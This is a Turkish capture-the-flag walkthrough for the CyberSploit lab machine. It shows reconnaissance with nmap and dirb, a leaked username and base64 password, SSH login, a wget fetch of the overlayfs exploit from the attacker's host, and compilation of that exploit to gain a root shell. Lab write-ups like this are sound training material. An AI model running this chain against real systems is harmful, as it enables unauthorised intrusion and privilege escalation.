@@ -1,0 +1,112 @@
+      ####Enumeration
+
+      ####Nmap
+Bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 11:36 EDT
+Nmap scan report for $targetip
+Host is up (0.036s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+      ####Kullanıcı Adı Açıklaması
+Hedefimizin 80 numaralı bağlantı noktasındaki varsayılan web sayfasının kaynak koduna bakarsak, aşağıdaki yorum satırını göreceğiz:
+kali@kali:~$ curl http://$targetip
+<!doctype html>
+<html lang="en">
+...
+<!-------------username:itsskv--------------------->
+</body>
+...
+Bu, kullanıcı adını sızdırıyor itsskv.
+
+Şifre Açıklaması
+dirb Varsayılan sözcük listesi ve özyinelemeli(recursive) olmayan seçenekle çalıştırmak , robots.txt dosyasının web'de bulunduğunu gösterir:
+kali@kali:~$ dirb http://$targetip -r
+...
+---- Scanning URL: http://$targetip/ ----
++ http://$targetip/cgi-bin/ (CODE:403|SIZE:291)
+...
++ http://$targetip/robots.txt (CODE:200|SIZE:79)
+...
+Dosyayı incelerken, base64 ile kodlanmış bir dize gibi görünen bir şeyle karşılaşıyoruz:
+kali@kali:~$ curl http://$targetip/robots.txt
+$censoredrobots.txt
+kali@kali:~$
+Aşağıdakileri ortaya çıkararak kodunu çözebiliriz:
+kali@kali:~$ curl http://$targetip/robots.txt | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    53  100    53    0     0    736      0 --:--:-- --:--:-- --:--:--   736
+cybersploit{youtube.com/c/cybersploit}
+...
+
+      ####Exploitation
+
+      ####SSH
+Kodu çözülmüş dize ( cybersploit{youtube.com/c/cybersploit}) oldukça tuhaf görünse de, keşfettiğimiz kullanıcı adının şifresi olarak deneyebiliriz:
+kali@kali:~$ ssh itsskv@$targetip
+...
+itsskv@$targetip's password: 
+...
+itsskv@cybersploit-CTF:~$ id
+uid=1001(itsskv) gid=1001(itsskv) groups=1001(itsskv)
+itsskv@cybersploit-CTF:~$
+Ve itsskv kullanıcısı olarak başarıyla kimlik doğrulaması yapıyoruz .
+
+
+      ####Local Enumeration
+Numaralandırılacak ilk şeylerden biri, hedefin çekirdek versiyonudur:
+itsskv@cybersploit-CTF:~$ uname -a
+Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
+itsskv@cybersploit-CTF:~$
+Bu çekirdek sürümünü araştırırken, bu sistemin overlayfsyerel ayrıcalık yükseltme istismarına karşı savunmasız olduğunu gördük (https://www.exploit-db.com/exploits/37292):
+kali@kali:~$ searchsploit "3.13.0"
+------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                 |  Path
+------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Loca | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Loca | linux/local/37293.txt
+------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+      ####Linux Çekirdeği İstismarı
+Kaynak kod dosyasını basit bir Python HTTP sunucusu kullanarak saldıran makinemizde barındıracağız ve hedef makineye indireceğiz.
+kali@kali:~$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+$targetip - - [03/Sep/2020 11:57:51] "GET /37292.c HTTP/1.1" 200 -
+...
+İstismarı hedef makinemize indirmek:
+itsskv@cybersploit-CTF:~$ cd /tmp/
+itsskv@cybersploit-CTF:/tmp$ wget http://$attackerip/37292.c
+--2020-09-03 21:27:52--  http://$attackerip/37292.c
+Connecting to $attackerip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3861 (3.8K) [text/plain]
+Saving to: `37292.c'
+
+100%[=======================================================================>] 3,861       --.-K/s   in 0s      
+
+2020-09-03 21:27:52 (208 MB/s) - `37292.c' saved [3861/3861]
+
+itsskv@cybersploit-CTF:/tmp$
+Ardından, kaynak kodunu derleyebiliriz:
+itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o 37292
+itsskv@cybersploit-CTF:/tmp$
+Son olarak, bu çekirdek sürümünden yararlanabiliyor ve yükseltilmiş bir kabuk elde edebiliyoruz:
+itsskv@cybersploit-CTF:/tmp$ whoami
+itsskv
+itsskv@cybersploit-CTF:/tmp$ ./37292
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# python -c 'import pty; pty.spawn("/bin/bash")'
+root@cybersploit-CTF:/tmp# 
+root@cybersploit-CTF:/tmp# whoami
+root
+root@cybersploit-CTF:/tmp#
